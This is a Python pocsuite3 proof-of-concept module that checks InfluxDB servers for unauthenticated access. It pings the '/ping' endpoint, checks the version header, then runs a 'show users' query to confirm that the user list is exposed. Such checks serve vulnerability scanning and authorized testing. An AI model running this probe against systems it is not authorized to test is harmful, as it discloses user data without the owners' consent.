#!/usr/bin/env python
#coding=utf-8

import traceback

from pocsuite3.api import requests as req
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE


class InfluxDB_POC(POCBase):
    vulID = 'InfluxDB-unauthorized-access'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    appName = 'InfluxDB'
    appVersion = ''
    category = POC_CATEGORY.EXPLOITS.REMOTE
    vulType = VUL_TYPE.INFORMATION_DISCLOSURE

    vulDate = '2020-04-13'  # 漏洞公开的时间,不知道就写今天
    author = 'shadowsock5'  # PoC作者的大名
    createDate = '2020-04-13'  # 编写 PoC 的日期
    updateDate = '2020-04-13'  # PoC 更新的时间,默认和编写时间一样
    references = ['https://github.com/chaitin/xray/blob/master/pocs/influxdb-unauth.yml']  # 漏洞地址来源,0day不用写
    name = 'InfluxDB未授权访问漏洞'  # PoC 名称
    cvss = u"高危"

    
    def _verify(self):
        result={}

        vul_url = self.url
        target_url = vul_url

        PING_PATH = '/ping'
        PING_URL =  vul_url + PING_PATH

        QUERY_PATH = '/query?q=show%20users'
        QUERY_URL  = vul_url + QUERY_PATH


        try:
            resp = req.get(PING_URL)

            # 从响应头判断确实是InfluxDB
            if resp.status_code == 204 and "x-influxdb-version" in resp.headers:

                resp = req.get(QUERY_URL)
                str_resp_json = str(resp.json())

                # 响应头为200 且json响应字符串包含columns和user，则认为查询成功
                if resp.status_code == 200 and 'columns' in str_resp_json and 'user' in str_resp_json:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = target_url
                    return self.save_output(result)

                return self.save_output(result)
        except Exception as e:
            print(e)
            traceback.print_stack()
        
        return self.save_output(result)

    #漏洞攻击
    def _attack(self):
        return self._verify()



    def save_output(self, result):
        #判断有无结果并输出
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail()
        return output

register_poc(InfluxDB_POC)
